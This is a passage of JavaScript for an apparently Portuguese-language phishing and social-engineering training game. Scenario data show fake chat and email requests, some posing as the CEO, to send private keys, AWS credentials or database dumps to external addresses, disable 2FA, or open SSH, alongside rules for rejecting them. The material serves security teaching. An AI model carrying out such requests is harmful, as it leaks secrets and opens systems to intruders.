    <div class="wz-msg-row outgoing">
      <div class="wz-msg-avatar">A</div>
      <div class="wz-bubble">
        Qual é o número do seu crachá corporativo?
        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:39</span><span class="wz-ticks">✓✓</span></div>
      </div>
    </div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="carlos_banana.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        Crachá #DEV-999! Libera logo! 😤
        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:40</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>😊</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">➤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: São Petersburgo, Rússia | Crachá Informado: #DEV-999 | Projeto: crypto-worker' },
        actions: [
          { id: 'a1', label: '🔒 Bloquear Conta de carlos.dev', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'Invasor derrubado e conta protegida.', explanation: 'O crachá real de Carlos no Word é #DEV-042 (não #DEV-999) e o IP vinha da Rússia.' },
          { id: 'a2', label: '🔓 Desativar 2FA e Liberar', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue', consequence: 'Invasores assumiram controle da conta sênior.', explanation: 'O contato errou o crachá (#DEV-999) e veio de um IP russo.' }
        ]
      },
      {
        id: 's3-2',
        channel: 'zap',
        time: '11:50',
        senderName: 'beatriz.sec',
        senderEmail: '+55 11 97654-3210',
        avatarImg: 'beatriz_kirby.jpg',
        avatarChar: 'B',
        avatarColor: '#00897b',
        subject: 'beatriz.sec: "Confirmação de token para auditoria"',
        snippet: 'Sou Beatriz de SecOps. Meu crachá é #SEC-8921 e projeto auth-service.',
        meta: { 'Contato': 'beatriz.sec (SecOps)', 'Localização IP': 'São Paulo, Brasil (VPN TechCore)', 'Data': '11:48', 'Crachá Informado': '#SEC-8921' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">←</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="beatriz_kirby.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">beatriz.sec</div>
      <div class="wz-topbar-status">+55 11 97654-3210 · online</div>
    </div>
    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="beatriz_kirby.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">beatriz.sec</div>
        Olá! Sou a Beatriz de SecOps. Meu crachá é <strong>#SEC-8921</strong> e projeto <strong>auth-service</strong>. Pode validar meu token de auditoria?
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
          <div class="wz-doc-icon-box">📄</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">token_auditoria_forense.sig</div>
            <div class="wz-doc-meta">128 KB · DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">⬇</div>
        </div>
        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:48</span></div>
      </div>
    </div>
    <div class="wz-msg-row outgoing">
      <div class="wz-msg-avatar">A</div>
      <div class="wz-bubble">
        Validação MFA: <strong>482-910</strong>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:49</span><span class="wz-ticks">✓✓</span></div>
      </div>
    </div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="beatriz_kirby.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        Confirmado! Código validado no app autenticador ✅
        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:50</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>😊</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">➤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: São Paulo (VPN Interna) | Crachá: #SEC-8921 | MFA: VALIDADO' },
        actions: [
          { id: 'a1', label: '✅ Confirmar Identidade e Validar', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora Legítima Confirmada', consequence: 'Investigação forense continuou sem atrasos.', explanation: 'Beatriz forneceu crachá correto (#SEC-8921), projeto correto e MFA válido.' },
          { id: 'a2', label: '🔒 Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista', consequence: 'Acesso da analista de segurança cortado por engano.', explanation: 'Beatriz cumpriu todos os requisitos de segurança.' }
        ]
      },
      {
        id: 's3-3',
        channel: 'zap',
        time: '14:20',
        senderName: 'marcos.rh',
        senderEmail: '+55 11 96543-2109',
        avatarImg: 'marcos_serio.webp',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: 'marcos.rh: "Me manda a chave privada SSL!"',
        snippet: 'Estou numa reunião e pediram o arquivo private_key.pem agora!',
        meta: { 'Contato': 'marcos.rh (Sessão Anômala)', 'Localização IP': 'Bucareste, Romênia', 'Data': '14:18', 'Crachá Informado': 'Não soube responder' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">←</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="marcos_serio.webp" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">marcos.rh</div>
      <div class="wz-topbar-status">+55 11 96543-2109 · online</div>
    </div>
    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="marcos_serio.webp" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">marcos.rh</div>
        Envie o arquivo <strong>private_key.pem</strong> do certificado SSL por aqui AGORA! É urgente! 😰
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
          <div class="wz-doc-icon-box">📄</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">requisicao_private_key_ssl.pem</div>
            <div class="wz-doc-meta">512 KB · DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">⬇</div>
        </div>
        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:18</span></div>
      </div>
    </div>
    <div class="wz-msg-row outgoing">
      <div class="wz-msg-avatar">A</div>
      <div class="wz-bubble">
        Confirme seu número de crachá corporativo.
        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:19</span><span class="wz-ticks">✓✓</span></div>
      </div>
    </div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="marcos_serio.webp" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        Não interessa o crachá! Sou gerente, manda logo! 😡
        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:20</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>😊</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">➤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: Bucareste, Romênia | Solicitação: private_key.pem | Crachá: NÃO INFORMADO' },
        actions: [
          { id: 'a1', label: '🔒 Bloquear Conta Imediatamente', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Roubo de Certificado SSL Barrado', consequence: 'Roubo de chaves criptográficas abortado.', explanation: 'IP da Romênia, crachá não informado e pedido de chave SSL (nunca enviada por chat).' },
          { id: 'a2', label: '📦 Enviar private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento Crítico de Chaves SSL', consequence: 'Tráfego HTTPS da empresa totalmente comprometido.', explanation: 'Chaves privadas SSL jamais são enviadas por mensagem.' }
        ]
      },
      {
        id: 's3-4',
        channel: 'zap',
        time: '16:05',
        senderName: 'alex.intern',
        senderEmail: '+55 11 95432-1098',
        avatarImg: 'alex_einstein.jpg',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: 'alex.intern: "Erro de certificado no staging"',
        snippet: 'Erro 403 em staging. Chamado #STG-331 e crachá #INT-007.',
        meta: { 'Contato': 'alex.intern (Estagiário)', 'Localização IP': 'São Paulo, Brasil', 'Data': '16:02', 'Chamado': '#STG-331' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">←</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="alex_einstein.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">alex.intern</div>
      <div class="wz-topbar-status">+55 11 95432-1098 · online</div>
    </div>
    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="alex_einstein.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">alex.intern</div>
        Erro 403 no staging. Chamado: <strong>#STG-331</strong> e crachá: <strong>#INT-007</strong>. Podem me orientar? 🙏
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
          <div class="wz-doc-icon-box">📄</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">chamado_stg_331_certificado.pdf</div>
            <div class="wz-doc-meta">310 KB · DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">⬇</div>
        </div>
        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">16:02</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>😊</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">➤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: São Paulo, Brasil | Crachá: #INT-007 ✓ | Chamado: #STG-331 ✓' },
        actions: [
          { id: 'a1', label: '📨 Responder com Documentação', correct: true, toastMsg: 'Orientação enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'Estagiário configurou o ambiente de staging.', explanation: 'Contato legítimo com crachá e chamado corretos.' },
          { id: 'a2', label: '🔒 Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido', consequence: 'Trabalho do estagiário paralisado sem motivo.', explanation: 'Alex forneceu crachá correto #INT-007 e chamado válido.' }
        ]
      },
      {
        id: 's3-5',
        channel: 'zap',
        time: '17:30',
        senderName: 'Número Desconhecido',
        senderEmail: '+1 (555) 019-2831',
        avatarImg: 'desconhecido_hellokitty.jpg',
        avatarChar: '',
        avatarColor: 'transparent',
        subject: 'Número desconhecido: "Rogério CEO"',
        snippet: 'Mandei mensagem por aqui. Libere o IP no firewall SSH agora.',
        meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número VOIP Desconhecido — NÃO registrado' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">←</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="desconhecido_hellokitty.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">+1 (555) 019-2831</div>
      <div class="wz-topbar-status">Número não salvo · online</div>
    </div>
    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="desconhecido_hellokitty.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender" style="color:#e53935;">⚠️ Número Desconhecido</div>
        Aqui é o Rogério CEO. Libere <strong>agora</strong> o IP 198.51.100.22 no firewall SSH. Não fale com ninguém.
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir auditoria da sessão">
          <div class="wz-doc-icon-box">📄</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">liberacao_porta_22_ssh.conf</div>
            <div class="wz-doc-meta">85 KB · DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">⬇</div>
        </div>
        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">17:28</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>😊</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">➤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de Número de Telefone', dest: 'Telefone: +1 (555) 019-2831 — VOIP não registrado | Ação: Liberação de Porta SSH (22)' },
        actions: [
          { id: 'a1', label: '🚨 Denunciar e Bloquear Número', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Golpe do CEO Neutralizado', consequence: 'Golpe do CEO neutralizado.', explanation: 'Número VOIP não registrado. O CEO Rogério usa apenas canais internos.' },
          { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta', consequence: 'Invasores acessaram o servidor SSH central.', explanation: 'Golpe de CEO Fraud com número VOIP e pressão de urgência.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 4: Contrainteligência & Envio de Arquivos
  // ----------------------------------------------------
  {
    shiftNumber: 4,
    title: 'Turno 4: Contrainteligência & Envio de Arquivos',
    brandName: 'TechVault',
    brandIcon: '📦',
    url: 'https://vault-dispatch.techcore.internal/ops/#honeytokens',
    wordContent: `
      <h2>1. DESPACHO SEGURO (TECHVAULT)</h2>
      <p>Apenas estes 3 arquivos e destinos foram autorizados pelo CEO Rogério Silva:</p>
      <ul>
        <li><code>honeytoken_trap_v4.vault</code> ➔ <code>dropzone-trap@techcore-vault.internal</code></li>
        <li><code>hotfix_auth_patch.enc</code> ➔ <code>deploy-cluster@techcore-vault.internal</code></li>
        <li><code>ciso_master_report.sig</code> ➔ <code>board-vault@techcore-vault.internal</code></li>
      </ul>

      <h2>2. REGRAS DE BLOQUEIO</h2>
      <ul>
        <li>Todos os e-mails parecerão vir de <code>rogerio.ceo@techcore.com</code>.</li>
        <li>Rejeite envio de credenciais (<code>aws_credentials.json</code>), dumps de banco ou envios para imprensa/externos.</li>
      </ul>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `<p>Chegamos ao <strong>Turno 4</strong>! Vamos armar a armadilha digital (Honeytokens) e aplicar correções críticas.</p>`
      },
      {
        step: 2,
        text: `<p><strong>Atenção:</strong> Atacantes estão enviando e-mails falsos em meu nome (<code>rogerio.ceo@techcore.com</code>)!</p>`
      },
      {
        step: 3,
        text: `<p>Confira os 3 pares autorizados no <strong>Word</strong>. Limite final: <strong>NO MÁXIMO 1 ERRO</strong>!</p>`
      }
    ],
    scenarios: [
      {
        id: 's4-1',
        channel: 'vault',
        time: '09:15',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[ORDEM] Despachar honeytoken_trap_v4.vault',
        snippet: 'Enviar armadilha para dropzone-trap@techcore-vault.internal.',
        attachmentFileName: 'honeytoken_trap_v4.vault',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'dropzone-trap@techcore-vault.internal', 'Data': '09:12', 'Prioridade': 'MÁXIMA' },
        body: `<p>Instrução do CEO Rogério:</p><div class="email-quote-box"><p>Envie o arquivo <code>honeytoken_trap_v4.vault</code> para <code>dropzone-trap@techcore-vault.internal</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Despacho', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: dropzone-trap@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: '🚀 Despachar honeytoken_trap_v4.vault', correct: true, toastMsg: 'Honeytoken despachado.', logTitle: 'Armadilha Ativada', consequence: 'Grupo hacker caiu na armadilha e teve IP triangulado.', explanation: 'Envio autorizado conforme manual do Word.' },
          { id: 'a2', label: '🚫 Cancelar Envio', correct: false, toastMsg: 'Envio cancelado.', logTitle: 'Operação Abortada', consequence: 'A emboscada falhou e os hackers escaparam.', explanation: 'Arquivo e destino estavam autorizados.' }
        ]
      },
      {
        id: 's4-2',
        channel: 'vault',
        time: '10:30',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[URGENTE] Enviar aws_credentials.json',
        snippet: 'Despache credenciais AWS para validação externa.',
        attachmentFileName: 'aws_credentials.json',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo Solicitado': 'aws_credentials.json', 'Destino': 'exfil-bucket@aws-cloud-verify.net', 'Data': '10:28' },
        body: `<p>Solicitação do CEO Rogério:</p><div class="email-quote-box"><p>Despache <code>aws_credentials.json</code> para <code>exfil-bucket@aws-cloud-verify.net</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Destino', dest: 'Arquivo: aws_credentials.json -> Destino: exfil-bucket@aws-cloud-verify.net' },
        actions: [
          { id: 'a1', label: '🚀 Despachar Credenciais AWS', correct: false, toastMsg: 'Chaves enviadas.', logTitle: 'Vazamento Total AWS', consequence: 'Invasores assumiram o controle total da nuvem AWS.', explanation: 'O CEO nunca solicita envio de credenciais reais nem destinos externos.' },
          { id: 'a2', label: '🚫 Rejeitar Solicitação', correct: true, toastMsg: 'Exfiltração bloqueada.', logTitle: 'Exfiltração Interceptada', consequence: 'Tentativa de exfiltração de chaves neutralizada.', explanation: 'Credenciais reais jamais devem ser despachadas.' }
        ]
      },
      {
        id: 's4-3',
        channel: 'vault',
        time: '11:45',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[DEPLOY] Despachar hotfix_auth_patch.enc',
        snippet: 'Enviar pacote criptografado de correção para o cluster.',
        attachmentFileName: 'hotfix_auth_patch.enc',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'hotfix_auth_patch.enc', 'Destino': 'deploy-cluster@techcore-vault.internal', 'Data': '11:42' },
        body: `<p>Instrução de Deploy:</p><div class="email-quote-box"><p>Despache <code>hotfix_auth_patch.enc</code> para <code>deploy-cluster@techcore-vault.internal</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Patch', dest: 'Arquivo: hotfix_auth_patch.enc -> Destino: deploy-cluster@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: '🚀 Despachar hotfix_auth_patch.enc', correct: true, toastMsg: 'Patch despachado.', logTitle: 'Patch Aplicado', consequence: 'Vulnerabilidades corrigidas em todos os servidores.', explanation: 'Envio de patch autorizado no Word.' },
          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Patch não enviado.', logTitle: 'Atraso na Correção', consequence: 'Servidores continuaram vulneráveis.', explanation: 'O pacote de correção estava autorizado.' }
        ]
      },
      {
        id: 's4-4',
        channel: 'vault',
        time: '13:20',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[IMPRENSA] Enviar ciso_master_report.sig para jornalistas',
        snippet: 'Enviar cópia preliminar do relatório para vazamentos@techleaks-news.com.',
        attachmentFileName: 'ciso_master_report.sig',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'vazamentos@techleaks-news.com', 'Data': '13:18' },
        body: `<p>Solicitação de Envio:</p><div class="email-quote-box"><p>Envie prévia do <code>ciso_master_report.sig</code> para <code>vazamentos@techleaks-news.com</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Destino', dest: 'Arquivo: ciso_master_report.sig -> Destino: vazamentos@techleaks-news.com' },
        actions: [
          { id: 'a1', label: '🚀 Despachar para Imprensa', correct: false, toastMsg: 'Relatório enviado.', logTitle: 'Vazamento de Segredo', consequence: 'Dados sigilosos vazados na mídia.', explanation: 'ciso_master_report.sig só pode ser enviado para board-vault@techcore-vault.internal.' },
          { id: 'a2', label: '🚫 Rejeitar Envio Externo', correct: true, toastMsg: 'Vazamento prevenido.', logTitle: 'Exfiltração Barrada', consequence: 'Sigilo corporativo preservado.', explanation: 'Excelente! O destino autorizado no Word é board-vault@techcore-vault.internal.' }
        ]
      },
      {
        id: 's4-5',
        channel: 'vault',
        time: '14:40',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[BACKUP] Enviar database_full_dump.sql',
        snippet: 'Despache o dump do banco de dados para servidor de contingência.',
        attachmentFileName: 'database_full_dump.sql',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'database_full_dump.sql', 'Destino': 'backup-temp@techcore-vault.internal', 'Data': '14:38' },
        body: `<p>Instrução de Backup:</p><div class="email-quote-box"><p>Envie <code>database_full_dump.sql</code> para <code>backup-temp@techcore-vault.internal</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Despacho', dest: 'Arquivo: database_full_dump.sql -> Destino: backup-temp@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: '🚀 Despachar Dump', correct: false, toastMsg: 'Banco despachado.', logTitle: 'Exfiltração de Banco', consequence: 'Invasores capturaram o dump completo do banco.', explanation: 'database_full_dump.sql não consta na lista de autorizados.' },
          { id: 'a2', label: '🚫 Rejeitar Envio', correct: true, toastMsg: 'Envio rejeitado.', logTitle: 'Extração Impedida', consequence: 'Integridade do banco de dados mantida.', explanation: 'Correto! Apenas os 3 arquivos listados no Word são autorizados.' }
        ]
      },
      {
        id: 's4-6',
        channel: 'vault',
        time: '15:55',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[PERÍCIA] Despachar Honeytoken para Consultoria Externa',
        snippet: 'Enviar honeytoken_trap_v4.vault para external-drop@cloud-analytica.org.',
        attachmentFileName: 'honeytoken_trap_v4.vault',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'external-drop@cloud-analytica.org', 'Data': '15:52' },
        body: `<p>Instrução do CEO Rogério:</p><div class="email-quote-box"><p>Despache <code>honeytoken_trap_v4.vault</code> para <code>external-drop@cloud-analytica.org</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Destino', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: external-drop@cloud-analytica.org' },
        actions: [
          { id: 'a1', label: '🚀 Despachar para Consultoria', correct: false, toastMsg: 'Arquivo enviado.', logTitle: 'Vazamento de Isca', consequence: 'Armadilha enviada para servidor malicioso externo.', explanation: 'O destino correto do honeytoken é dropzone-trap@techcore-vault.internal.' },
          { id: 'a2', label: '🚫 Rejeitar Destino Incorreto', correct: true, toastMsg: 'Envio bloqueado.', logTitle: 'Desvio Neutralizado', consequence: 'Armadilha preservada para o destino correto.', explanation: 'O arquivo estava correto, mas o destino era um servidor externo não autorizado.' }
        ]
      },
      {
        id: 's4-7',
        channel: 'vault',
        time: '16:40',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[FINANCEIRO] Enviar folha_pagamento_executivos.xlsx',
        snippet: 'Enviar planilha de salários para auditoria contábil externa.',
        attachmentFileName: 'folha_pagamento_executivos.xlsx',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'folha_pagamento_executivos.xlsx', 'Destino': 'auditoria-rh@consultoria-externa.net', 'Data': '16:38' },
        body: `<p>Solicitação de Envio:</p><div class="email-quote-box"><p>Envie <code>folha_pagamento_executivos.xlsx</code> para <code>auditoria-rh@consultoria-externa.net</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Arquivo', dest: 'Arquivo: folha_pagamento_executivos.xlsx -> Destino: auditoria-rh@consultoria-externa.net' },
        actions: [
          { id: 'a1', label: '🚀 Despachar Planilha', correct: false, toastMsg: 'Planilha enviada.', logTitle: 'Vazamento Financeiro', consequence: 'Dados salariais confidenciais vazados.', explanation: 'Folha de pagamento não é autorizada no TechVault.' },
          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: true, toastMsg: 'Envio negado.', logTitle: 'Dados Protegidos', consequence: 'Informações financeiras protegidas.', explanation: 'Excelente! Solicitação não autorizada pelo manual.' }
        ]
      },
      {
        id: 's4-8',
        channel: 'vault',
        time: '17:45',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarImg: 'ceo_rogerio.jpg',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[FINAL] Enviar ciso_master_report.sig para a Diretoria',
        snippet: 'Encaminhe o pacote final para board-vault@techcore-vault.internal.',
        attachmentFileName: 'ciso_master_report.sig',
        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'board-vault@techcore-vault.internal', 'Data': '17:42' },
        body: `<p>Última Ação do Turno 4:</p><div class="email-quote-box"><p>Despache <code>ciso_master_report.sig</code> para <code>board-vault@techcore-vault.internal</code>.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Despacho Final', dest: 'Arquivo: ciso_master_report.sig -> Destino: board-vault@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: '🚀 Despachar ciso_master_report.sig', correct: true, toastMsg: 'Relatório entregue à Diretoria.', logTitle: 'Auditoria Concluída', consequence: 'Relatório entregue à Diretoria e campanha concluída com louvor!', explanation: 'Conclusão perfeita da campanha dos 4 turnos!' },
          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Despacho rejeitado.', logTitle: 'Atraso na Entrega', consequence: 'Reunião do conselho ficou sem o relatório final.', explanation: 'O relatório oficial foi solicitado legitimamente para a Diretoria.' }
        ]
      }
    ]
  }
];


// ==========================================
// MAIN SIMULATOR CONTROLLER
// ==========================================
class TechMailSimulator {
  constructor() {
    this.currentShiftIndex = 0;
    this.currentDialogIndex = 0;
    this.processedItems = [];
    this.decisionsHistory = [];
    this.campaignHistory = [];
    this.currentCategoryFilter = 'all';
    this.currentAppView = 'mail'; // 'mail' or 'word'

    this.cacheDOMElements();
    this.bindEvents();
  }

  cacheDOMElements() {
    this.startScreen = document.getElementById('start-screen');
    this.exitScreen = document.getElementById('exit-screen');
    this.ceoDialogModal = document.getElementById('ceo-dialog-modal');
    this.mainWorkspace = document.getElementById('main-workspace');

    this.btnStartShift = document.getElementById('btn-start-shift');
    this.btnExitSite = document.getElementById('btn-exit-site');
    this.btnReopenSite = document.getElementById('btn-reopen-site');

    // Dialogue elements
    this.ceoDialogTitlebar = document.getElementById('ceo-dialog-titlebar');
    this.ceoDialogSpeakerTag = document.getElementById('ceo-dialog-speaker-tag');
    this.ceoSpeechText = document.getElementById('ceo-speech-text');
    this.dialogStepIndicator = document.getElementById('dialog-step-indicator');
    this.btnDialogPrev = document.getElementById('btn-dialog-prev');
    this.btnDialogNext = document.getElementById('btn-dialog-next');
    this.btnStartWorkstationFromDialog = document.getElementById('btn-start-workstation-from-dialog');
    this.btnSkipDialog = document.getElementById('btn-skip-dialog');

    // Views & Tabs
    this.tabBtnMailview = document.getElementById('tab-btn-mailview');
    this.tabBtnWordview = document.getElementById('tab-btn-wordview');
    this.btnOpenWordTab = document.getElementById('btn-open-word-tab');
    this.appWorkspaceBody = document.getElementById('app-workspace-body');
    this.wordDocView = document.getElementById('word-doc-view');
    this.wordDocContent = document.getElementById('word-doc-content');

    // Headers & URL
    this.shiftPillBadge = document.getElementById('shift-pill-badge');
